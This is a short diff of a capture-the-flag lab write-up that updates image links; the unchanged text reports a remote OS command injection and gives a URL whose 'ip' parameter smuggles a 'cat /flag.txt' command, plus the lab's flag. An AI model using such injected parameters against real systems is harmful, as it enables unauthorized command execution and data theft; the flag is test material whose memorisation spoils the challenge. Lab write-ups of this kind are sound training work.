@@ -63,10 +63,10 @@ As we can see, the report shows all identified details in an organized manner, w
 
 # Question
 ---
-![[Pasted image 20250124133143.png]]
+![](../images/Pasted%20image%2020250124133143.png)
 
 Based on the scan, we are facing `Remote OS command injection`, we can simply view the flag by going to: `http://94.237.59.180:47717/devtools/ping.php?ip=127.0.0.1%26cat+%2Fflag.txt%26`
 
-![[Pasted image 20250124140103.png]]
+![](../images/Pasted%20image%2020250124140103.png)
 
 Flag is: `HTB{5c4nn3r5_f1nd_vuln5_w3_m155}`
